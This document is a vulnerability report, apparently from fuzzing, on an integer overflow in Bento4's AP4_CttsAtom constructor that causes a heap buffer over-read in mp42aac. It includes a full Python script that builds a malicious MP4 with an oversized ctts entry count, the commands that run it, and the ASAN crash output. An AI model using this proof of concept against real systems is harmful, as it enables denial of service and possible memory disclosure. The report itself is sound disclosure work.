## Bug0: AP4_CttsAtom Integer Overflow Leading to Heap Buffer Over-read

In `AP4_CttsAtom::AP4_CttsAtom()` in `Ap4CttsAtom.cpp`, the constructor allocates a read buffer as `new unsigned char[entry_count * 8]` without validating that `entry_count` is bounded by the atom size, so when a crafted MP4 supplies `entry_count >= 0x20000000` the `uint32_t` multiplication wraps to zero, a zero-byte heap buffer is allocated, and the subsequent loop reads far past the allocation causing a heap buffer over-read.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(box_type, payload):
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type.encode() + payload

def fullbox(box_type, version, flags, payload):
    fb_payload = struct.pack(">B", version) + struct.pack(">I", flags)[1:] + payload
    return box(box_type, fb_payload)

def make_ftyp():
    payload = b"mp42"
    payload += struct.pack(">I", 0)
    payload += b"mp42" + b"isom"
    return box("ftyp", payload)

def make_mvhd():
    payload = struct.pack(">IIII", 0, 0, 1000, 0)
    payload += struct.pack(">I", 0x00010000)
    payload += struct.pack(">H", 0x0100)
    payload += b"\x00" * 10
    matrix = struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += matrix
    payload += b"\x00" * 24
    payload += struct.pack(">I", 2)
    return fullbox("mvhd", 0, 0, payload)

def make_tkhd():
    payload = struct.pack(">II", 0, 0)
    payload += struct.pack(">I", 1)
    payload += b"\x00" * 4
    payload += struct.pack(">I", 0)
    payload += b"\x00" * 8
    payload += struct.pack(">hh", 0, 0)
    payload += struct.pack(">H", 0x0100)
    payload += b"\x00" * 2
    matrix = struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += matrix
    payload += struct.pack(">II", 0, 0)
    return fullbox("tkhd", 0, 0x0f, payload)

def make_mdhd():
    payload = struct.pack(">IIII", 0, 0, 44100, 0)
    payload += struct.pack(">H", 0x15c7)
    payload += struct.pack(">H", 0)
    return fullbox("mdhd", 0, 0, payload)

def make_hdlr():
    payload = struct.pack(">I", 0)
    payload += b"soun"
    payload += b"\x00" * 12
    payload += b"\x00"
    return fullbox("hdlr", 0, 0, payload)

def make_smhd():
    payload = struct.pack(">HH", 0, 0)
    return fullbox("smhd", 0, 0, payload)

def make_dinf():
    url_entry = fullbox("url ", 0, 1, b"")
    dref_payload = struct.pack(">I", 1) + url_entry
    dref = fullbox("dref", 0, 0, dref_payload)
    return box("dinf", dref)

def make_stsd():
    payload = struct.pack(">I", 0)
    return fullbox("stsd", 0, 0, payload)

def make_stts():
    payload = struct.pack(">I", 0)
    return fullbox("stts", 0, 0, payload)

def make_ctts_malicious():
    ENTRY_COUNT = 0x20000000  # entry_count*8 overflows to 0 in uint32_t
    payload = struct.pack(">I", ENTRY_COUNT)
    return fullbox("ctts", 0, 0, payload)

def make_stsc():
    payload = struct.pack(">I", 0)
    return fullbox("stsc", 0, 0, payload)

def make_stsz():
    payload = struct.pack(">II", 0, 0)
    return fullbox("stsz", 0, 0, payload)

def make_stco():
    payload = struct.pack(">I", 0)
    return fullbox("stco", 0, 0, payload)

def make_stbl():
    payload = (make_stsd() + make_stts() + make_ctts_malicious() +
               make_stsc() + make_stsz() + make_stco())
    return box("stbl", payload)

def make_minf():
    payload = make_smhd() + make_dinf() + make_stbl()
    return box("minf", payload)

def make_mdia():
    payload = make_mdhd() + make_hdlr() + make_minf()
    return box("mdia", payload)

def make_trak():
    payload = make_tkhd() + make_mdia()
    return box("trak", payload)

def make_moov():
    payload = make_mvhd() + make_trak()
    return box("moov", payload)

ftyp = make_ftyp()
moov = make_moov()
mp4 = ftyp + moov

with open("poc_input.mp4", "wb") as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to poc_input.mp4")
print(f"[+] ctts entry_count = 0x20000000 -> entry_count*8 overflows to 0")
print(f"[+] Expected: heap buffer over-read in AP4_CttsAtom constructor loop")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f1 at pc 0x55d00e596094 bp 0x7ffc7cb3e2e0 sp 0x7ffc7cb3e2d0
READ of size 1 at 0x5020000000f1 thread T0
    #0 0x55d00e596093 in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa1093)
    #1 0x55d00e597087 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

An attacker who can supply a crafted MP4 file to any invocation of mp42aac can trigger a heap buffer over-read in `AP4_CttsAtom::AP4_CttsAtom()`, which causes a process crash (denial of service) and may leak adjacent heap memory contents to a caller that inspects the parsed entry data (information disclosure). Because the overflowed allocation size is zero the over-read spans an unbounded range of heap memory, and on systems where heap layout is attacker-influenced the primitive could contribute to further memory corruption primitives.
